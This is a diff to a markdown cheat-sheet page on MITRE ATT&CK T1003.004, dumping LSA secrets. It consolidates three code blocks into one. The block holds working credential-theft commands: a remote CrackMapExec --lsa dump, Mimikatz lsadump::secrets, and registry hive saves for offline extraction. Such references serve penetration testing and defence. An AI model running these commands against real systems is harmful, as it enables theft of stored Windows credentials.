@@ -6,21 +6,14 @@ description: MITRE ATT&CK, Credential Access, Sub-technique T1003.004
 
 ### Dumping LSA Secrets
 
-Dumping LSA Secrets with CrackMapExec:
-
 ```bash
+# Dumping LSA Secrets remotely with CrackMapExec
 crackmapexec smb $ip -u $user -p $password --lsa
-```
 
-Dumping LSA Secrets with Mimikatz:
-
-```bash
+# Dumping LSA Secrets with Mimikatz
 lsadump::secrets
-```
 
-Dumping LSA Secrets manually and then reading them with Mimikatz
-
-```powershell
+# Dumping LSA Secrets manually and then reading them with Mimikatz
 reg save HKLM\SYSTEM system & reg save HKLM\security security
 lsadump::secrets /system:c:\temp\system /security:c:\temp\security
 ```
